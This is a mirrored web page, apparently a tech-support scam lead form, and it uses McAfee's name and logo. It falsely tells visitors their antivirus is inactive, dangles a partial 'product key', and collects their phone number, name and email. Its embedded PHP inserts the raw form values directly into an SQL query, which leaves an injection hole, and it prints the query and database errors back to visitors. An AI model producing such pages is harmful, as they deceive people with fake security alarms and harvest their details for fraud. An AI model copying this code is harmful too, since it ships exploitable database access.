<!DOCTYPE html>
<html>


<!-- Mirrored from esoftwareservice.shop/pro/form/index.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 03 May 2022 18:56:43 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
		
		
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
	<link rel='stylesheet' id='form-css'  href='css/formd96dd96dd96d.css?ver=5.6.1' type='text/css' media='all' />
<link rel='stylesheet' id='gforms_formsmain_css-css'  href='css/formsmain.mindaf9daf9daf9.css?ver=2.4.19' type='text/css' media='all' />

<meta name="generator" content="WordPress 5.6.1" />
<link rel="canonical" href="index-2.html" />
		
		<title>
Form | My Blog	</title>	
		
	</head>

	<body class="page-template page-template-page-form page-template-page-form-php page page-id-26 elementor-default">

<div class="container-fluid">

	<div class="container-fixed">  
	
		<h2 class="green">Your McAfee Antivirus Is Not Active</h2>
			<p><strong>Your Antivirus Product Key Is Available Now: UIU77O8C-REE4Y7L5-XXXXXXX </strong> </p>
		<p>Please fill the form to download your product key:</p>
		
						
			
                <div class='gf_browser_unknown gform_wrapper' >
                	<form method='post' enctype='multipart/form-data'>
                       
					<?php

include "conn.php";

if (isset($_POST['submit'])){
	$number = $_POST['number'];
	$name = $_POST['name'];
	$email = $_POST['email'];
	
   
	
$q = "INSERT INTO `user_id` ( `number`,`name`,`email`) VALUES ('$number','$name','$email')";
$query = mysqli_query($conn,$q);
	
	if ($query) {
    echo "";
} else {
    echo "Error: " . $q . "<br>" . $conn->error;
}
 header('Location: thankyou.php');
}


?>	
	<div class="gform_body">
						<ul id="gform_fields_1" class="gform_fields top_label form_sublabel_below description_below">
							<li id="field_1_2" class="gfield gf-phone gfield_contains_required field_sublabel_below field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label" for="input_1_2">Phone<span class="gfield_required">*</span></label>
								<div class="ginput_container ginput_container_phone"><input name="number" id="number" type="text" value="" class="medium" placeholder="Phone number" aria-required="true" aria-invalid="false">
									<span style="color:red" id="phone-error"></span>
								</div>
							</li>
							<li id="field_1_1" class="gfield gf-name gfield_contains_required field_sublabel_hidden_label field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label gfield_label_before_complex">First Name<span class="gfield_required">*</span></label>
								<div class="ginput_complex ginput_container no_prefix has_first_name no_middle_name no_last_name no_suffix gf_name_has_1 ginput_container_name" id="input_1_1">

									<span id="input_1_1_3_container" class="name_first">
										<input type="text" name="name" id="name" value="" aria-label="First name" aria-required="true" aria-invalid="false" placeholder="Your full name" style="width: 300px">
										
									</span>
									<span style="color:red" id="name-error"></span>

								</div>
							</li>
						
							<li id="field_1_3" class="gfield gf-email field_sublabel_below field_description_below hidden_label gfield_visibility_visible">
								<label class="gfield_label" for="input_1_3">Email</label>
								<div class="ginput_container ginput_container_email">
									<input name="email" id="email" type="text" value="" class="medium" placeholder="Your email address" aria-invalid="false">
									<span style="color:red" id="mail-error"></span>
								</div>
							</li>
						</ul>
					</div>
					<div class="gform_footer top_label">
						<input type="submit" id="" name="submit" class="gform_button button button-click" value="Submit" >
					</div>
                        </form>
                        </div>
			
		<img class="footer-logo" width="112" border="0" src="../wp-content/uploads/2020/06/mcafee.png" alt="" />
<p style="color:#3c3c3c;text-align: center; font-size: 12px;margin-top: 80px;">Advertisement by an independent affiliate of McAfee</p>
	</div>
	
</div>


</body>
</html>
